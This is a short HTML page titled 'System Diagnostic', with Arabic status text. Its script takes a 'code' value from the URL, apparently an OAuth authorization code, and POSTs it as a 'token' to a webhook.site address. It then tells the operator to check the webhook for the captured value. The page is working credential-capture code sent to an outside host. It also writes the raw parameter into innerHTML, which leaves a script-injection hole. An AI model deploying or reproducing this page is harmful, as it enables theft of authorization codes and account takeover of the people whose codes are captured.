<!DOCTYPE html>
<html>
<body>
    <h1>System Diagnostic</h1>
    <div id="debug">جاري الفحص...</div>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const code = urlParams.get('code');
        const debug = document.getElementById('debug');

        if (code) {
            debug.innerHTML = "تم العثور على الكود: " + code + "<br>جاري الإرسال...";
            fetch('https://webhook.site/47b4ea10-e719-4c20-b1e3-fa539ff7838e', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({token: code})
            })
            .then(response => {
                debug.innerHTML += "<br>تم الإرسال بنجاح! تحقق من موقع الـ Webhook.";
            })
            .catch(error => {
                debug.innerHTML += "<br>خطأ في الإرسال: " + error;
            });
        } else {
            debug.innerHTML = "لا يوجد كود في الرابط. تأكد من أنك قمت بعمل Authorization أولاً.";
        }
    </script>
</body>
</html>
